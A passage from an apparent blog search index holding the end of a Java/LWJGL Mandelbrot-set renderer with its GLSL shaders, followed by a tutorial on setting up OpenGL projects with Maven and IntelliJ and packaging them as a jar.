vertices = new float[] { -2.0f, 2.0f, // Vertex 0 -2.0f, -2.0f, // Vertex 1 2.0f, -2.0f, // Vertex 2 2.0f, 2.0f // Vertex 3 }; // VBO (Vertex Buffer Object) FloatBuffer vboBuffer = BufferUtils.createFloatBuffer(vertices.length); for(float vertex : vertices) { vboBuffer.put(vertex); } vboBuffer.flip(); // Pass data to GPU int positionElementCount = vertices.length / 4; int vboID = GL30.glGenBuffers(); GL30.glBindBuffer(GL30.GL_ARRAY_BUFFER, vboID); GL30.glBufferData(GL30.GL_ARRAY_BUFFER, vboBuffer, GL30.GL_STATIC_DRAW); GL30.glVertexAttribPointer(0, positionElementCount, GL_FLOAT, false, positionElementCount * Float.BYTES, 0); GL30.glEnableVertexAttribArray(0); // Indices int[] indices = new int[] { 0, 1, 2, 2, 3, 0 }; // IBO (Index Buffer Object) IntBuffer iboBuffer = BufferUtils.createIntBuffer(indices.length); for(int index : indices) { iboBuffer.put(index); } iboBuffer.flip(); // Pass data to GPU int iboID = GL30.glGenBuffers(); GL30.glBindBuffer(GL30.GL_ELEMENT_ARRAY_BUFFER, iboID); GL30.glBufferData(GL30.GL_ELEMENT_ARRAY_BUFFER, iboBuffer, GL30.GL_STATIC_DRAW); // Shaders int programID = GL30.glCreateProgram(); int vertShaderObj = GL30.glCreateShader(GL30.GL_VERTEX_SHADER); int fragShaderObj = GL30.glCreateShader(GL30.GL_FRAGMENT_SHADER); String vertexShader = parseShaderFromFile(&quot;/shaders/vert.shader&quot;); GL30.glShaderSource(vertShaderObj, vertexShader); GL30.glCompileShader(vertShaderObj); String fragmentShader = parseShaderFromFile(&quot;/shaders/frag.shader&quot;); GL30.glShaderSource(fragShaderObj, fragmentShader); GL30.glCompileShader(fragShaderObj); GL30.glAttachShader(programID, vertShaderObj); GL30.glAttachShader(programID, fragShaderObj); GL30.glLinkProgram(programID); GL30.glValidateProgram(programID); GL30.glUseProgram(programID); float basePanningSpeed = 0.0125f; float currentPanningSpeed = 0.0125f; float zoomAmount = 1.0f; float zoomSpeed = 1.05f; // Run the rendering loop until the user has attempted to close // the window or has pressed the ESCAPE key. while ( !glfwWindowShouldClose(window) ) { glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); // clear the framebuffer // Camera Panning if(upArrow) { // Translate the projection matrix by the distance cameraSpeed in the positive y direction pmatrix.translate(new Vector3f(0.0f, currentPanningSpeed, 0.0f)); } if(downArrow) { // Translate the projection matrix by the distance cameraSpeed in the negative y direction pmatrix.translate(new Vector3f(0.0f, -currentPanningSpeed, 0.0f)); } if(rightArrow) { // Translate the projection matrix by the distance cameraSpeed in the positive x direction pmatrix.translate(new Vector3f(currentPanningSpeed, 0.0f, 0.0f)); } if(leftArrow) { // Translate the projection matrix by the distance cameraSpeed in the negative x direction pmatrix.translate(new Vector3f(-currentPanningSpeed, 0.0f, 0.0f)); } // Zooming if(zoomingIn) { zoomAmount = zoomAmount * zoomSpeed; // Update the zoomAmount currentPanningSpeed = basePanningSpeed / zoomAmount; // Update camera panning speed pmatrix.scaleLocal(zoomSpeed); // Zoom In } else if(zoomingOut) { zoomAmount = zoomAmount * (1 / zoomSpeed); // Update the zoomAmount currentPanningSpeed = basePanningSpeed / zoomAmount; // Update camera panning speed pmatrix.scaleLocal(1 / zoomSpeed); // Zoom Out } // Camera try (MemoryStack stack = MemoryStack.stackPush()) { FloatBuffer projection = pmatrix.get(stack.mallocFloat(4 * 4)); int mat4location = GL30.glGetUniformLocation(programID, &quot;u_MVP&quot;); GL30.glUniformMatrix4fv(mat4location, false, projection); } GL30.glDrawElements(GL30.GL_TRIANGLES, indices.length, GL_UNSIGNED_INT, 0); //Draw our square glfwSwapBuffers(window); // swap the color buffers // Poll for window events. The key callback above will only be // invoked during this call. glfwPollEvents(); } } private static String parseShaderFromFile(String filePath) { StringBuilder data = new StringBuilder(); String line = &quot;&quot;; try { BufferedReader reader = new BufferedReader(new InputStreamReader(Application.class.getResourceAsStream(filePath))); line = reader.readLine(); while( line != null ) { data.append(line); data.append(&#39;\\n&#39;); line = reader.readLine(); } } catch(Exception e) { throw new IllegalArgumentException(&quot;Unable to load shader from: &quot; + filePath, e); } return data.toString(); } public static void main(String[] args) { new Application().run(); }}/shaders/vert.shaderlayout(location = 0) in vec2 position;uniform mat4 u_MVP;out vec2 v_Pos;void main() { gl_Position = u_MVP * vec4(position, 0, 1.0); v_Pos = position;}/shaders/frag.shaderprecision highp float;in vec2 v_Pos;vec2 squareImaginary(vec2 imaginaryNum) { vec2 imaginaryResult; imaginaryResult.x = (imaginaryNum.x * imaginaryNum.x) - (imaginaryNum.y * imaginaryNum.y); imaginaryResult.y = 2 * imaginaryNum.x * imaginaryNum.y; return imaginaryResult;}vec3 colorFunc(int iter) { // Color in HSV - Tweak these values to your liking and for different coloring effects vec3 color = vec3(0.012*iter , 1.0, 0.2+.4*(1.0+sin(0.3*iter))); // Convert from HSV to RGB // Taken from: http://lolengine.net/blog/2013/07/27/rgb-to-hsv-in-glsl vec4 K = vec4(1.0, 2.0 / 3.0, 1.0 / 3.0, 3.0); vec3 m = abs(fract(color.xxx + K.xyz) * 6.0 - K.www); return vec3(color.z * mix(K.xxx, clamp(m - K.xxx, 0.0, 1.0), color.y));}void main() { vec2 c, z; c = v_Pos; // c starts as the current position z = c; // We can skip one iteration of the function where z = 0 as it is uneccessary if we simply set z = c vec3 color = vec3(0.0, 0.0, 0.0); // The default color will be black int iterations = 100; // 100 is a good number of iterations for(int i = 0; i &amp;lt; iterations; i++) { // fc(z) = z^2 + c - Here we iterate over this function until it either becomes greater than 2 or not vec2 result = squareImaginary(z) + c; if(length(result) &amp;gt; 2.0) { // This is a point not in the mandelbrot set - Change color based on iterations color = colorFunc(i); break; } z = result; } // Color the point gl_FragColor = vec4(color, 1.0);}" }, { "title": "Tutorial - Using Maven and IntelliJ for OpenGL Projects", "url": "/posts/tutorial-using-maven-and-intellij-for-opengl-projects/", "categories": "Old", "tags": "opengl, lwjgl, maven, tutorial", "date": "2020-05-28 13:00:00 +0100", "snippet": "This tutorial will quickly cover how one can use Maven along with IntelliJ to get started with graphics programming using OpenGL. I originally wrote this so people could use it to directly follow along with my Visualising the Mandelbrot Set Tutorial Series but I believe it is a great way to setup any OpenGL project in java. I use IntelliJ as my main IDE for programming Java and so that is what this tutorial will use, however others like eclipse will have an almost identical process with the only difference being the importing of the project.Prerequisite: Install Maven for your specific OS before following this tutorial.The pom.xmlThe most important part of creating a Maven project is the pom.xml configuration file. In here we will define all kinds of things related to our project such as the libraries it depends on, various settings, information about the author and much more. This file and the source code for our project is all that we will need to compile our java application in the future making using Maven incredibly simple.In terms of our pom.xml file for OpenGL programming we are going to obtain it from the LWJGL customize page. As I mentioned in the Mandelbrot Tutorial, LWJGL is a great java binding for many OpenGL functions. To get a fully configured pom.xml file with all required LWJGL dependencies we can simply choose the “Maven” option under “Mode” and it will generate one for us which we can download from the bottom of the page. For the Mandelbrot Set tutorial series I chose the Minimal OpenGL preset, the JOML math library addon and version 3.2.3 (the latest at the time). With those options selected our pom.xml file should look something like the following:&amp;lt;properties&amp;gt; &amp;lt;lwjgl.version&amp;gt;3.2.3&amp;lt;/lwjgl.version&amp;gt; &amp;lt;joml.version&amp;gt;1.9.24&amp;lt;/joml.version&amp;gt; &amp;lt;lwjgl.natives&amp;gt;natives-windows&amp;lt;/lwjgl.natives&amp;gt;&amp;lt;/properties&amp;gt;&amp;lt;dependencyManagement&amp;gt; &amp;lt;dependencies&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-bom&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;${lwjgl.version}&amp;lt;/version&amp;gt; &amp;lt;scope&amp;gt;import&amp;lt;/scope&amp;gt; &amp;lt;type&amp;gt;pom&amp;lt;/type&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;/dependencies&amp;gt;&amp;lt;/dependencyManagement&amp;gt;&amp;lt;dependencies&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-assimp&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-glfw&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-openal&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-opengl&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-stb&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl&amp;lt;/artifactId&amp;gt; &amp;lt;classifier&amp;gt;${lwjgl.natives}&amp;lt;/classifier&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-assimp&amp;lt;/artifactId&amp;gt; &amp;lt;classifier&amp;gt;${lwjgl.natives}&amp;lt;/classifier&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-glfw&amp;lt;/artifactId&amp;gt; &amp;lt;classifier&amp;gt;${lwjgl.natives}&amp;lt;/classifier&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-openal&amp;lt;/artifactId&amp;gt; &amp;lt;classifier&amp;gt;${lwjgl.natives}&amp;lt;/classifier&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-opengl&amp;lt;/artifactId&amp;gt; &amp;lt;classifier&amp;gt;${lwjgl.natives}&amp;lt;/classifier&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-stb&amp;lt;/artifactId&amp;gt; &amp;lt;classifier&amp;gt;${lwjgl.natives}&amp;lt;/classifier&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.joml&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;joml&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;${joml.version}&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt;&amp;lt;/dependencies&amp;gt;This pom.xml is actually incomplete. LWJGL has simply provided us with the various dependency declarations but we still are missing any actual information about our project. If we head on over to Maven’s POM reference page we can take a look at the Quick Overview section. Here you will see some examples of simple configuration options. Before any of that, however, the most important thing to take note of is the &amp;lt;project&amp;gt;&amp;lt;/project&amp;gt; block which must encapsulate any pom.xml file. We will start by adding that to our file with their settings:&amp;lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt; &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt; &amp;lt;properties&amp;gt; &amp;lt;lwjgl.version&amp;gt;3.2.3&amp;lt;/lwjgl.version&amp;gt; &amp;lt;joml.version&amp;gt;1.9.24&amp;lt;/joml.version&amp;gt; &amp;lt;lwjgl.natives&amp;gt;natives-windows&amp;lt;/lwjgl.natives&amp;gt; &amp;lt;/properties&amp;gt; &amp;lt;dependencyManagement&amp;gt; &amp;lt;dependencies&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-bom&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;${lwjgl.version}&amp;lt;/version&amp;gt; &amp;lt;scope&amp;gt;import&amp;lt;/scope&amp;gt; &amp;lt;type&amp;gt;pom&amp;lt;/type&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;/dependencies&amp;gt; &amp;lt;/dependencyManagement&amp;gt; &amp;lt;dependencies&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-assimp&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-glfw&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-openal&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-opengl&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-stb&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl&amp;lt;/artifactId&amp;gt; &amp;lt;classifier&amp;gt;${lwjgl.natives}&amp;lt;/classifier&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-assimp&amp;lt;/artifactId&amp;gt; &amp;lt;classifier&amp;gt;${lwjgl.natives}&amp;lt;/classifier&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-glfw&amp;lt;/artifactId&amp;gt; &amp;lt;classifier&amp;gt;${lwjgl.natives}&amp;lt;/classifier&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-openal&amp;lt;/artifactId&amp;gt; &amp;lt;classifier&amp;gt;${lwjgl.natives}&amp;lt;/classifier&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-opengl&amp;lt;/artifactId&amp;gt; &amp;lt;classifier&amp;gt;${lwjgl.natives}&amp;lt;/classifier&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-stb&amp;lt;/artifactId&amp;gt; &amp;lt;classifier&amp;gt;${lwjgl.natives}&amp;lt;/classifier&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.joml&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;joml&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;${joml.version}&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;/dependencies&amp;gt;&amp;lt;/project&amp;gt;With that in place all we need to do is specify some information about our project. The most important ones are &amp;lt;groupId&amp;gt;, &amp;lt;artifactId&amp;gt; and &amp;lt;version&amp;gt;. The &amp;lt;groupId&amp;gt; is simply going to be a unique identifier for projects by you. Generally people set this to a domain that they own or something else unique to them. &amp;lt;artifactId&amp;gt; has the same concept except it’s unique to the specific project the pom.xml file is used for. Finally, &amp;lt;version&amp;gt; is the just version of your project. Some other options you may also want to configure might include &amp;lt;licenses&amp;gt;, &amp;lt;developers&amp;gt; or &amp;lt;url&amp;gt;. If you want to read up on what these are used for, once again you can check out the POM reference page’s Quick Overview section. With these extra options in our pom.xml it will now look something like this:&amp;lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt; &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt; &amp;lt;groupId&amp;gt;io.github.cianjinks&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;MandelbrotViewerTutorial&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;1.1&amp;lt;/version&amp;gt; &amp;lt;developers&amp;gt; &amp;lt;developer&amp;gt; &amp;lt;name&amp;gt;Cian Jinks&amp;lt;/name&amp;gt; &amp;lt;email&amp;gt;cjinks99@gmail.com&amp;lt;/email&amp;gt; &amp;lt;/developer&amp;gt; &amp;lt;/developers&amp;gt; &amp;lt;properties&amp;gt; &amp;lt;lwjgl.version&amp;gt;3.2.3&amp;lt;/lwjgl.version&amp;gt; &amp;lt;joml.version&amp;gt;1.9.24&amp;lt;/joml.version&amp;gt; &amp;lt;lwjgl.natives&amp;gt;natives-windows&amp;lt;/lwjgl.natives&amp;gt; &amp;lt;/properties&amp;gt; &amp;lt;dependencyManagement&amp;gt; &amp;lt;dependencies&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-bom&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;${lwjgl.version}&amp;lt;/version&amp;gt; &amp;lt;scope&amp;gt;import&amp;lt;/scope&amp;gt; &amp;lt;type&amp;gt;pom&amp;lt;/type&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;/dependencies&amp;gt; &amp;lt;/dependencyManagement&amp;gt; &amp;lt;dependencies&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-assimp&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-glfw&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-openal&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-opengl&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-stb&amp;lt;/artifactId&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl&amp;lt;/artifactId&amp;gt; &amp;lt;classifier&amp;gt;${lwjgl.natives}&amp;lt;/classifier&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-assimp&amp;lt;/artifactId&amp;gt; &amp;lt;classifier&amp;gt;${lwjgl.natives}&amp;lt;/classifier&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-glfw&amp;lt;/artifactId&amp;gt; &amp;lt;classifier&amp;gt;${lwjgl.natives}&amp;lt;/classifier&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-openal&amp;lt;/artifactId&amp;gt; &amp;lt;classifier&amp;gt;${lwjgl.natives}&amp;lt;/classifier&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-opengl&amp;lt;/artifactId&amp;gt; &amp;lt;classifier&amp;gt;${lwjgl.natives}&amp;lt;/classifier&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;lwjgl-stb&amp;lt;/artifactId&amp;gt; &amp;lt;classifier&amp;gt;${lwjgl.natives}&amp;lt;/classifier&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.joml&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;joml&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;${joml.version}&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;/dependencies&amp;gt;&amp;lt;/project&amp;gt;Maven with IntelliJWith our pom.xml all set up it finally comes time to start a new project using IntelliJ. To do so we simply create a new project as normal, except this time we choose the Maven option:Once the project is created you will see it comes with a generated pom.xml file. Here we can just paste in our own pom.xml file we have created above and import the changes. This will automatically download all of the required dependencies for use within our project. We can now create a new java file under src/main/java called whatever we want (In my case I just made Application.java with a main function). This is where all of our packages and code will go and we can import any of our libraries downloaded by our pom.xml into classes here. Importing and using some random functions from OpenGL and JOML you can see no errors are thrown and all is working:Running our program in IntelliJ works the very same as usual. Simply create a run configuration of type Application and specify the entry file and you are all good to go.Compiling to JAR fileNOTE: For this section of the tutorial I replaced Application.java with the Application.java that we left off with in Part 1 of the Mandelbrot Set Tutorial Series and brought our shaders over into the resources folder. This means we are now essentially working as if this project is the one from the tutorial.When you want to distribute your java project it is common to package it all into a single jar file which can then be ran by people cross platform. Maven makes this incredibly easy to accomplish as it comes with some inbuilt commands for doing so. You can run any of these commands from the Maven tab on the right side of the IntelliJ window:Running install will usually generate a folder named target in the root directory of your project and in here will be the compiled jar file for your project. However if you try running this as is, you will run into errors similar to these:Source option 5 is no longer supported. Use 6 or later.Target option 1.5 is no longer supported. Use 1.6 or later.To fix these we are going to have to make a few more modifications to our pom.xml file. First off we need to specify 3 new properties:&amp;lt;properties&amp;gt; &amp;lt;lwjgl.version&amp;gt;3.2.3&amp;lt;/lwjgl.version&amp;gt; &amp;lt;joml.version&amp;gt;1.9.20&amp;lt;/joml.version&amp;gt; &amp;lt;lwjgl.natives&amp;gt;natives-windows&amp;lt;/lwjgl.natives&amp;gt; &amp;lt;maven.compiler.source&amp;gt;1.8&amp;lt;/maven.compiler.source&amp;gt; &amp;lt;maven.compiler.target&amp;gt;1.8&amp;lt;/maven.compiler.target&amp;gt; &amp;lt;project.build.sourceEncoding&amp;gt;UTF-8&amp;lt;/project.build.sourceEncoding&amp;gt;&amp;lt;/properties&amp;gt;These properties simply specify what version of java we want our project to be compiled with. Once added, install will now function correctly and produce our jar file in target. If you go ahead and try to run this jar file you will encounter yet another error. To make this work we require a simple plugin to package all of our dependencies together and specify an entry file for our program jar. Here is the xml for that plugin:&amp;lt;build&amp;gt; &amp;lt;plugins&amp;gt; &amp;lt;plugin&amp;gt; &amp;lt;artifactId&amp;gt;maven-assembly-plugin&amp;lt;/artifactId&amp;gt; &amp;lt;executions&amp;gt; &amp;lt;execution&amp;gt; &amp;lt;id&amp;gt;make-assembly&amp;lt;/id&amp;gt; &amp;lt;phase&amp;gt;package&amp;lt;/phase&amp;gt; &amp;lt;goals&amp;gt; &amp;lt;goal&amp;gt;single&amp;lt;/goal&amp;gt; &amp;lt;/goals&amp;gt; &amp;lt;/execution&amp;gt; &amp;lt;/executions&amp;gt; &amp;lt;configuration&amp;gt; &amp;lt;archive&amp;gt; &amp;lt;manifest&amp;gt; &amp;lt;!--Here we point to our main class based on our package.--&amp;gt; &amp;lt;!--In my class I will simply put Application as my main class is called Application--&amp;gt; &amp;lt;!--and is not within any packages.--&amp;gt; &amp;lt;mainClass&amp;gt;com.packagename.class&amp;lt;/mainClass&amp;gt; &amp;lt;/manifest&amp;gt; &amp;lt;/archive&amp;gt; &amp;lt;descriptorRefs&amp;gt; &amp;lt;descriptorRef&amp;gt;jar-with-dependencies&amp;lt;/descriptorRef&amp;gt; &amp;lt;/descriptorRefs&amp;gt; &amp;lt;appendAssemblyId&amp;gt;false&amp;lt;/appendAssemblyId&amp;gt; &amp;lt;/configuration&amp;gt; &amp;lt;/plugin&amp;gt; &amp;lt;/plugins&amp;gt;&amp;lt;/build&amp;gt;If we go ahead and add this to our pom.xml everything should now work perfectly. We can compile a jar file of our project using Maven’s install and run it using any machine with java installed. Here is how my final pom.xml looks:&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt; &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt; &amp;lt;groupId&amp;gt;com.hobbesos&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;MandelbrotViewerTutorial&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;1.1&amp;lt;/version&amp;gt; &amp;lt;url&amp;gt;https://github.com/cianjinks/MandelbrotViewer&amp;lt;/url&amp;gt; &amp;lt;licenses&amp;gt; &amp;lt;license&amp;gt; &amp;lt;name&amp;gt;MIT License&amp;lt;/name&amp;gt; &amp;lt;url&amp;gt;http://www.opensource.org/licenses/mit-license.php&amp;lt;/url&amp;gt; &amp;lt;/license&amp;gt; &amp;lt;/licenses&amp;gt; &amp;lt;developers&amp;gt; &amp;lt;developer&amp;gt; &amp;lt;name&amp;gt;Cian Jinks&amp;lt;/name&amp;gt; &amp;lt;email&amp;gt;cjinks99@gmail.com&amp;lt;/email&amp;gt; &amp;lt;/developer&amp;gt; &amp;lt;/developers&amp;gt; &amp;lt;properties&amp;gt; &amp;lt;lwjgl.version&amp;gt;3.2.3&amp;lt;/lwjgl.version&amp;gt; &amp;lt;joml.version&amp;gt;1.9.20&amp;lt;/joml.version&amp;gt; &amp;lt;lwjgl.natives&amp;gt;natives-windows&amp;lt;/lwjgl.natives&amp;gt; &amp;lt;maven.compiler.source&amp;gt;1.8&amp;lt;/maven.compiler.source&amp;gt; &amp;lt;maven.compiler.target&amp;gt;1.8&amp;lt;/maven.compiler.target&amp;gt; &amp;lt;project.build.sourceEncoding&amp;gt;UTF-8&amp;lt;/project.build.sourceEncoding&amp;gt; &amp;lt;/properties&amp;gt; &amp;lt;dependencyManagement&amp;gt; &amp;lt;dependencies&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.lwjgl&amp;lt;/groupId&amp;gt; 